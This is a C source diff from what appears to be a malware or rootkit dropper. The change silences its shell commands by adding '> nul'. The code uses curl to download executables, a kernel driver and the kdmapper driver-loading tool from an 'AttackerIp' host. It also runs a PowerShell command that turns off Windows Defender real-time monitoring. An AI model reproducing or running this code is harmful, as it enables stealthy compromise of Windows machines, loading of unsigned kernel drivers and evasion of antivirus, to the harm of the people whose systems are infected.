@@ -224,8 +224,8 @@ BOOL PerformCommand(const char* CommandArr[], const char* Replacements[], const 
 
 
 int VerfifyDepDirs() {
-    if (system("if not exist C:\\nosusfolder\\verysus\\KMDFdriver\\Release mkdir C:\\nosusfolder\\verysus\\KMDFdriver\\Release") == -1 ||
-        system("if not exist C:\\nosusfolder\\verysus\\MainMedium\\x64\\Release mkdir C:\\nosusfolder\\verysus\\MainMedium\\x64\\Release") == -1) {
+    if (system("if not exist C:\\nosusfolder\\verysus\\KMDFdriver\\Release mkdir C:\\nosusfolder\\verysus\\KMDFdriver\\Release > nul") == -1 ||
+        system("if not exist C:\\nosusfolder\\verysus\\MainMedium\\x64\\Release mkdir C:\\nosusfolder\\verysus\\MainMedium\\x64\\Release > nul") == -1) {
         return GetLastError();
     }
     return 0;
@@ -233,24 +233,24 @@ int VerfifyDepDirs() {
 
 
 int VerfifyDepFiles(const char* AttackerIp) {
-    const char* FileCommands[] = { "cd C:\\ && ",
-        "if not exist nosusfolder\\verysus\\MainMedium\\MainMedium.sln curl http://~:8080/MainMedium/MainMedium.sln --output nosusfolder\\verysus\\MainMedium\\MainMedium.sln && ",
-        "if not exist nosusfolder\\verysus\\MainMedium\\medium.cpp curl http://~:8080/MainMedium/medium.cpp --output nosusfolder\\verysus\\MainMedium\\medium.cpp && ",
-        "if not exist nosusfolder\\verysus\\MainMedium\\medium.h curl http://~:8080/MainMedium/medium.h --output nosusfolder\\verysus\\MainMedium\\medium.h && ",
-        "if not exist nosusfolder\\verysus\\MainMedium\\rootreqs.cpp curl http://~:8080/MainMedium/rootreqs.cpp --output nosusfolder\\verysus\\MainMedium\\rootreqs.cpp && ",
-        "if not exist nosusfolder\\verysus\\MainMedium\\rootreqs.h curl http://~:8080/MainMedium/rootreqs.h --output nosusfolder\\verysus\\MainMedium\\rootreqs.h && ",
-        "if not exist nosusfolder\\verysus\\MainMedium\\internet.cpp curl http://~:8080/MainMedium/internet.cpp --output nosusfolder\\verysus\\MainMedium\\internet.cpp && ",
-        "if not exist nosusfolder\\verysus\\MainMedium\\internet.h curl http://~:8080/MainMedium/internet.h --output nosusfolder\\verysus\\MainMedium\\internet.h && ",
-        "if not exist nosusfolder\\verysus\\MainMedium\\helpers.cpp curl http://~:8080/MainMedium/helpers.cpp --output nosusfolder\\verysus\\MainMedium\\helpers.cpp && ",
-        "if not exist nosusfolder\\verysus\\MainMedium\\helpers.h curl http://~:8080/MainMedium/helpers.h --output nosusfolder\\verysus\\MainMedium\\helpers.h && ",
-        "if not exist nosusfolder\\verysus\\MainMedium\\MainMedium.vcxproj curl http://~:8080/MainMedium/MainMedium.vcxproj --output nosusfolder\\verysus\\MainMedium\\MainMedium.vcxproj && ",
-        "if not exist nosusfolder\\verysus\\MainMedium\\MainMedium.vcxproj.filters curl http://~:8080/MainMedium/MainMedium.vcxproj.filters --output nosusfolder\\verysus\\MainMedium\\MainMedium.vcxproj.filters && ",
-        "if not exist nosusfolder\\verysus\\MainMedium\\MainMedium.vcxproj.user curl http://~:8080/MainMedium/MainMedium.vcxproj.user --output nosusfolder\\verysus\\MainMedium\\MainMedium.vcxproj.user && ",
-        "if not exist nosusfolder\\verysus\\MainMedium\\x64\\Release\\MainMedium.exe curl http://~:8080/MainMedium/x64/Release/MainMedium.exe --output nosusfolder\\verysus\\MainMedium\\x64\\Release\\MainMedium.exe && ",
-        "if not exist nosusfolder\\verysus\\AutoStart.exe curl http://~:8080/trypack/AutoStart/x64/Release/AutoStart.exe --output nosusfolder\\verysus\\AutoStart.exe && ",
-        "if not exist nosusfolder\\verysus\\KMDFdriver\\Release\\KMDFdriver.sys curl http://~:8080/KMDFdriver/x64/Release/KMDFdriver/KMDFdriver.sys --output nosusfolder\\verysus\\KMDFdriver\\Release\\KMDFdriver.sys && ",
-        "if not exist nosusfolder\\verysus\\KMDFdriver\\Release\\KMDFdriver.inf curl http://~:8080/KMDFdriver/x64/Release/KMDFdriver/KMDFdriver.inf --output nosusfolder\\verysus\\KMDFdriver\\Release\\KMDFdriver.inf && ",
-        "if not exist nosusfolder\\verysus\\KMDFdriver\\Release\\KMDFdriver.pdb curl http://~:8080/KMDFdriver/x64/Release/KMDFdriver.pdb --output nosusfolder\\verysus\\KMDFdriver\\Release\\KMDFdriver.pdb && ",
+    const char* FileCommands[] = { "cd C:\\  > nul && ",
+        "if not exist nosusfolder\\verysus\\MainMedium\\MainMedium.sln curl http://~:8080/MainMedium/MainMedium.sln --output nosusfolder\\verysus\\MainMedium\\MainMedium.sln  > nul && ",
+        "if not exist nosusfolder\\verysus\\MainMedium\\medium.cpp curl http://~:8080/MainMedium/medium.cpp --output nosusfolder\\verysus\\MainMedium\\medium.cpp  > nul && ",
+        "if not exist nosusfolder\\verysus\\MainMedium\\medium.h curl http://~:8080/MainMedium/medium.h --output nosusfolder\\verysus\\MainMedium\\medium.h  > nul && ",
+        "if not exist nosusfolder\\verysus\\MainMedium\\rootreqs.cpp curl http://~:8080/MainMedium/rootreqs.cpp --output nosusfolder\\verysus\\MainMedium\\rootreqs.cpp  > nul && ",
+        "if not exist nosusfolder\\verysus\\MainMedium\\rootreqs.h curl http://~:8080/MainMedium/rootreqs.h --output nosusfolder\\verysus\\MainMedium\\rootreqs.h  > nul && ",
+        "if not exist nosusfolder\\verysus\\MainMedium\\internet.cpp curl http://~:8080/MainMedium/internet.cpp --output nosusfolder\\verysus\\MainMedium\\internet.cpp  > nul && ",
+        "if not exist nosusfolder\\verysus\\MainMedium\\internet.h curl http://~:8080/MainMedium/internet.h --output nosusfolder\\verysus\\MainMedium\\internet.h  > nul && ",
+        "if not exist nosusfolder\\verysus\\MainMedium\\helpers.cpp curl http://~:8080/MainMedium/helpers.cpp --output nosusfolder\\verysus\\MainMedium\\helpers.cpp  > nul && ",
+        "if not exist nosusfolder\\verysus\\MainMedium\\helpers.h curl http://~:8080/MainMedium/helpers.h --output nosusfolder\\verysus\\MainMedium\\helpers.h  > nul && ",
+        "if not exist nosusfolder\\verysus\\MainMedium\\MainMedium.vcxproj curl http://~:8080/MainMedium/MainMedium.vcxproj --output nosusfolder\\verysus\\MainMedium\\MainMedium.vcxproj  > nul && ",
+        "if not exist nosusfolder\\verysus\\MainMedium\\MainMedium.vcxproj.filters curl http://~:8080/MainMedium/MainMedium.vcxproj.filters --output nosusfolder\\verysus\\MainMedium\\MainMedium.vcxproj.filters  > nul && ",
+        "if not exist nosusfolder\\verysus\\MainMedium\\MainMedium.vcxproj.user curl http://~:8080/MainMedium/MainMedium.vcxproj.user --output nosusfolder\\verysus\\MainMedium\\MainMedium.vcxproj.user  > nul && ",
+        "if not exist nosusfolder\\verysus\\MainMedium\\x64\\Release\\MainMedium.exe curl http://~:8080/MainMedium/x64/Release/MainMedium.exe --output nosusfolder\\verysus\\MainMedium\\x64\\Release\\MainMedium.exe  > nul && ",
+        "if not exist nosusfolder\\verysus\\AutoStart.exe curl http://~:8080/trypack/AutoStart/x64/Release/AutoStart.exe --output nosusfolder\\verysus\\AutoStart.exe  > nul && ",
+        "if not exist nosusfolder\\verysus\\KMDFdriver\\Release\\KMDFdriver.sys curl http://~:8080/KMDFdriver/x64/Release/KMDFdriver/KMDFdriver.sys --output nosusfolder\\verysus\\KMDFdriver\\Release\\KMDFdriver.sys  > nul && ",
+        "if not exist nosusfolder\\verysus\\KMDFdriver\\Release\\KMDFdriver.inf curl http://~:8080/KMDFdriver/x64/Release/KMDFdriver/KMDFdriver.inf --output nosusfolder\\verysus\\KMDFdriver\\Release\\KMDFdriver.inf  > nul && ",
+        "if not exist nosusfolder\\verysus\\KMDFdriver\\Release\\KMDFdriver.pdb curl http://~:8080/KMDFdriver/x64/Release/KMDFdriver.pdb --output nosusfolder\\verysus\\KMDFdriver\\Release\\KMDFdriver.pdb  > nul && ",
         "if not exist nosusfolder\\verysus\\kdmapper.exe curl http://~:8080/kdmapper/x64/Release/kdmapper.exe --output nosusfolder\\verysus\\kdmapper.exe" };
     const char* ReplaceArr[1] = { AttackerIp };
     const char* SymbolsArr = "~";
@@ -277,8 +277,8 @@ BOOL WINAPI CtrlHandler(DWORD ControlType) {
 
 RETURN_LAST RealTime(BOOL IsDisable) {
     RETURN_LAST LastError = { 0, ERROR_SUCCESS };
-    const char* Disable = "powershell.exe -command \"Set-MpPreference -DisableRealtimeMonitoring $true\"";
-    const char* Enable = "powershell.exe -command \"Set-MpPreference -DisableRealtimeMonitoring $false\"";
+    const char* Disable = "powershell.exe -command \"Set-MpPreference -DisableRealtimeMonitoring $true\" > nul";
+    const char* Enable = "powershell.exe -command \"Set-MpPreference -DisableRealtimeMonitoring $false\" > nul";
     if (IsDisable) {
         LastError.LastError = system(Disable);
     }
